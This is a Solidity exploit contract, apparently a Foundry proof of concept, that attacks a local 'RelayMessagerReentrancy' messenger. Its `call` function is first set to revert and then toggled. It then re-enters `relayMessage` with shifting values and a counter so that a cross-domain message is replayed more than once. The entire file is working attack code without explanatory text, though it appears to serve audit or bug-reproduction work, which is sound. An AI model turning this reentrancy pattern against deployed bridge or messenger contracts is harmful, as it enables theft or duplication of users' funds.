// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./RelayMessagerReentrancy.sol";
import "forge-std/console.sol";


contract Exploit {

    RelayMessagerReentrancy messager;

    uint256 public counter;
    bool public willRevert = true;
    uint256 public value = 1 wei;

    constructor(address _messager) {
        messager = RelayMessagerReentrancy(_messager);
    }

    function setCounter(uint _counter) public {
        counter = _counter;
    }

    function setRevert(bool _val) public {
        willRevert = _val;
    }   

   function call(
        address messager,
        uint256 _nonce,
        address _sender,
        address _target,
        uint256 _value,
        uint256 _minGasLimit
    ) external payable {

        if(willRevert) {
            revert("transaction reverted!");
        }

        if( counter == 2) {
            return;
        }

        counter += 1;

        uint256 oldValue = value;
        value += 1 wei;

        bytes memory message = abi.encodeWithSelector(
            Exploit.call.selector,
            messager,
            3,
            _sender,
            _target,
            0 wei,
            _minGasLimit
        );
  
        RelayMessagerReentrancy(messager).relayMessage(
            oldValue, 
            _sender, 
            _target,
            0,
            _minGasLimit, 
            message
        );

    }

}